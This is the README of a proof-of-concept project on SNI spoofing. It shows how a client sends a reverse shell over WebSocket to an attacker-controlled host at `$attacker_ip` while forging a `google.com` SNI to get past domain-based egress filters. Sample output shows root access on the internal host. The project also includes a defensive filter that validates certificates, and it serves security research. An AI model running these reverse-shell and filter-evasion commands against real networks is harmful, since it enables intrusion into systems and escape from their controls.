# SNI Manipulation

This project demonstrates a proof-of-concept for Server Name Indication (SNI)
manipulation in TLS connections to bypass egress HTTP traffic controls that
filter by domain.

This PoC includes a Terraformed AWS environment and client/server implementations in Go and TypeScript to demonstrate sending reverse shells with spoofed SNI
values to bypass egress HTTP controls. The reverse shells are sent over a WebSocket connection.

A defensive PoC tool is included that explores possible countermeasures.
It filters TLS traffic by SNI value, like Squid proxy, and then goes one step further by validating the target server's certificate. The certificate
validation result is cached for performance, like a stateful firewall does.


## Background

SNI manipulation is a technique to bypass HTTP traffic controls that filter by domain by forging the SNI value in the TLS handshake.

IP addresses are ephemeral and change often with cloud-hosted services, making IP address filters harder to maintain and more likely to break.
Domain filtering is easier to maintain and is less likely to break, but most connections are encrypted by default.
There are two options for filtering encrypted traffic by domain:
1. SNI inspection of the TLS handshake
2. TLS decryption and inspection of the payload

SNI inspection relies on a value supplied by the client during the TLS handshake, a variant of "trusting the client".
This opens domain filtering by SNI inspection up to spoofing attacks (SNI manipulation).

## Build the PoC and Login to the Hosts

Build the Go server, client, and filter. The binaries are placed in the `dist` directory.

```sh
make build
```

Build the Terraformed AWS environment (or use your own).

```sh
cd terraform-aws-sni-filter
terraform init
terraform apply
```

Connect to each host with the following scripts:
- The filtering NAT instance: `./scripts/nat-login.sh`
- The "attacker" host: `./scripts/attacker-login.sh`
- The internal host: `./scripts/internal-login.sh`

## Getting Started

### SNI Bypass (Offense)

On the intermediate router/NAT host, run the filtering proxy that blocks TLS
traffic by SNI value. This works just like Squid proxies, AWS Network Firewall,
and other TLS inspection proxies.
The host's `iptables` rules will transparently redirect HTTPS traffic to the filtering proxy PoC.

```sh
./filter --domain-file domains.txt --default deny
Allowing domain: ubuntu.com
Allowing domain: .github.com
Allowing domain: google.com
Allowing domain: .google.com
TLS filter listening on port 3130
```

On the "attacker" host, run the server that accepts reverse shells.
The server will listen on all interfaces on port 443. The `sudo` command is
required to bind to port 443.

```sh
sudo ./server 0.0.0.0 443
WebSocket Server is running on wss://0.0.0.0:443
```

On the internal host, run the client to launch a reverse shell at the attacker
server with a spoofed SNI value.

```sh
./client $attacker_ip 443 google.com
```

When the client connects to the server with a forged SNI value, the filtering
proxy will allow the connection because the SNI value is spoofed with `google.com`.
The attacker's server will receive the reverse shell and can begin issuing
commands on the internal host.

```sh
[ec2-user@ip-10-0-1-146 ~]$ sudo ./server 0.0.0.0 443
WebSocket Server is running on wss://0.0.0.0:443

Reverse shell established!

ec2-user@ip-10-0-2-50.ec2.internal:/home/ec2-user $ sudo whoami
root
```

### SNI Filtering With Certificate Validation (Defense)

The filtering proxy PoC has a `--verify` flag that validates the target server's certificate. If the target server does not have a valid certificate that matches the SNI value, the connection is blocked. If the target server has a valid certificate that matches the SNI value, the connection is allowed and the result is cached for performance.
Think of it like a stateful firewall with [`conntrack`](https://man.archlinux.org/man/conntrack.8.en) for TLS connections and domains.

```sh
./filter --domain-file domains.txt --default deny --verify
Certificate verification enabled
Allowing domain: ubuntu.com
Allowing domain: .github.com
Allowing domain: google.com
Allowing domain: .google.com
TLS filter listening on port 3130
```

Now when the client attempts to connect to the attacker server with a forged SNI value...

```sh
./client $attacker_ip 443 google.com
Error connecting to WebSocket server:remote error: tls: bad certificate
```

... the filtering proxy will block the connection with the error "invalid certificate".

```sh
Allowed TLS connection from [10.0.2.50:35006] to [172.253.63.139:443] with SNI [google.com]
Blocked TLS connection from [10.0.2.50:58322] to [100.26.145.239:443] with SNI [google.com] (invalid certificate)
```

The filtering proxy asked the attacker's server for a certificate for `google.com` and tried to validate it. When the attacker's server did not have a valid certificate for `google.com`, the filtering proxy blocked the connection.

## Ethical Considerations

This example is intended for educational and research purposes only. Always obtain proper authorization before testing on any networks or systems you do not own or have explicit permission to test.
